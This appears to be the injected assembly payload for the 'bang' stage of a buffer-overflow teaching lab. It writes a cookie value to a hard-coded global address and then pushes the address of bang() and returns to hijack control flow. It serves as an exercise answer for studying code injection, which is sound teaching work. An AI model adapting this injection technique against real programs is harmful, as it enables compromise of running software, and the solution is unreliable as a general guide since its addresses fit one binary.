# change the global_value
movl $0x73c62104, 0x804c218
# the addr of bang()
push $0x08048d05 
ret
